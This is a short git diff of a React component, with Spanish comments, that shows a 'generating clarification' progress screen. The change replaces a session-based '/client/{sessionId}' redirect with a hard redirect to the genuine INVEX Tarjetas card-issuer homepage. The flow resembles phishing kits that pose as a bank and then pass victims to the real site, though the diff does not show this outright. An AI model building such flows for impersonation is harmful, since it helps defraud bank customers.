@@ -21,22 +21,24 @@ const GenerandoAclaracion: React.FC = () => {
     return () => clearInterval(interval);
   }, []);
 
-  // Efecto para redirigir a la página del cliente después de completar la barra
+  // Efecto para redirigir a la página de INVEX Tarjetas después de completar la barra
   useEffect(() => {
     if (progress === 100) {
       const redirectTimeout = setTimeout(() => {
-        // Verificar si la URL contiene un código de sesión
-        const pathParts = window.location.pathname.split('/');
-        if (pathParts.length > 1 && pathParts[1]) {
-          // Si hay un código de sesión en la URL, redirigir al cliente
-          const sessionId = pathParts[1];
-          setLocation(`/client/${sessionId}`);
-        }
+        // Redirigir a la página de INVEX Tarjetas
+        window.location.href = 'https://www.invextarjetas.com.mx/index#/home';
+
+        // Si en el futuro se quiere mantener la lógica anterior para casos específicos:
+        // const pathParts = window.location.pathname.split('/');
+        // if (pathParts.length > 1 && pathParts[1]) {
+        //   const sessionId = pathParts[1];
+        //   setLocation(`/client/${sessionId}`);
+        // }
       }, 500);
 
       return () => clearTimeout(redirectTimeout);
     }
-  }, [progress, setLocation]);
+  }, [progress]);
 
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-white text-center p-4">
